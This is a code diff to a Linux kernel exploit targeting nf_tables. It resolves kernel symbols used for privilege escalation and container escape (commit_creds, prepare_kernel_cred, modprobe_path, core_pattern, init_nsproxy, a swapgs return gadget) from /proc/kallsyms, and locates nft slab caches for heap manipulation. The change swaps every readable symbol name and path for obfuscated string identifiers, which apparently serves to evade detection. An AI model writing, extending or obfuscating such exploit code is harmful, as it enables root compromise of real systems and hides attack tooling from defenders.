@@ -1,6 +1,7 @@
 #include "nfttables.h"
 #include "arch.h"
 #include "offsets.h"
+#include "obf.h"
 #include <fnmatch.h>
 
 /* ── hardcoded offset database ────────────────────────────────── */
@@ -246,25 +247,25 @@ int offsets_from_database(struct kernel_offsets *ko, const char *release)
 
 int offsets_from_kallsyms(struct kernel_offsets *ko)
 {
-    FILE *f = fopen("/proc/kallsyms", "r");
+    FILE *f = fopen(S(S_PROC_KALLSYMS), "r");
     if (!f) return -1;
 
     char line[256];
     int found = 0;
 
-    struct { const char *sym; uint64_t *dst; } targets[] = {
-        {"_text",                  &ko->kernel_base},
-        {"_stext",                 &ko->kernel_base},
-        {"modprobe_path",          &ko->modprobe_path},
-        {"core_pattern",           &ko->core_pattern},
-        {"poweroff_cmd",           &ko->poweroff_cmd},
-        {"prepare_kernel_cred",    &ko->prepare_kernel_cred},
-        {"commit_creds",           &ko->commit_creds},
-        {"find_task_by_vpid",      &ko->find_task_by_vpid},
-        {"switch_task_namespaces", &ko->switch_task_namespaces},
-        {"init_nsproxy",           &ko->init_nsproxy},
-        {"swapgs_restore_regs_and_return_to_usermode", &ko->swapgs_restore_regs},
-        {NULL, NULL},
+    struct { int sid; uint64_t *dst; } targets[] = {
+        {S_TEXT,          &ko->kernel_base},
+        {S_STEXT,         &ko->kernel_base},
+        {S_MODPROBE_PATH, &ko->modprobe_path},
+        {S_CORE_PATTERN,  &ko->core_pattern},
+        {S_POWEROFF_CMD,  &ko->poweroff_cmd},
+        {S_PREPARE_CRED,  &ko->prepare_kernel_cred},
+        {S_COMMIT_CREDS,  &ko->commit_creds},
+        {S_FIND_TASK,     &ko->find_task_by_vpid},
+        {S_SWITCH_NS,     &ko->switch_task_namespaces},
+        {S_INIT_NSPROXY,  &ko->init_nsproxy},
+        {S_SWAPGS_RET,    &ko->swapgs_restore_regs},
+        {-1, NULL},
     };
 
     while (fgets(line, sizeof(line), f)) {
@@ -275,10 +276,10 @@ int offsets_from_kallsyms(struct kernel_offsets *ko)
         if (addr == 0)
             continue;
 
-        for (int i = 0; targets[i].sym; i++) {
+        for (int i = 0; targets[i].sid >= 0; i++) {
             if (*targets[i].dst != 0)
                 continue;
-            if (strcmp(sym, targets[i].sym) == 0) {
+            if (strcmp(sym, S(targets[i].sid)) == 0) {
                 *targets[i].dst = addr;
                 found++;
             }
@@ -316,7 +317,7 @@ int slab_info_by_name(const char *cache_name, struct slab_info *si)
 {
     memset(si, 0, sizeof(*si));
 
-    FILE *f = fopen("/proc/slabinfo", "r");
+    FILE *f = fopen(S(S_PROC_SLABINFO), "r");
     if (!f) return -1;
 
     char line[512];
@@ -388,7 +389,7 @@ int slab_find_nft_caches(struct kernel_offsets *ko)
     int found = 0;
 
     /* try dedicated nft caches first */
-    if (slab_info_by_name("nft_chain", &ko->nft_chain_slab) == 0) {
+    if (slab_info_by_name(S(S_NFT_CHAIN_CACHE), &ko->nft_chain_slab) == 0) {
         found++;
     } else if (ko->nft_chain_slab.obj_size > 0) {
         /* use the size from offset DB to find the kmalloc cache */
@@ -397,7 +398,7 @@ int slab_find_nft_caches(struct kernel_offsets *ko)
             found++;
     }
 
-    if (slab_info_by_name("nft_set", &ko->nft_set_slab) == 0) {
+    if (slab_info_by_name(S(S_NFT_SET_CACHE), &ko->nft_set_slab) == 0) {
         found++;
     } else if (ko->nft_set_slab.obj_size > 0) {
         if (slab_info_for_size(ko->nft_set_slab.obj_size,
@@ -433,7 +434,7 @@ int offsets_resolve(struct kernel_offsets *ko, const char *release)
     if (!(ko->resolved & OFF_GADGETS) && !(ko->resolved & OFF_CRED_FUNCS)) {
         char vmlinuz[256], vmlinux[256];
         if (vmlinux_find_boot_image(vmlinuz, sizeof(vmlinuz)) == 0) {
-            snprintf(vmlinux, sizeof(vmlinux), "/tmp/.nft_vmlinux_%d", getpid());
+            snprintf(vmlinux, sizeof(vmlinux), S(S_NFT_VMLINUX_FMT), getpid());
             if (vmlinux_extract(vmlinuz, vmlinux) == 0) {
                 offsets_from_vmlinux(ko, vmlinux);
                 unlink(vmlinux);
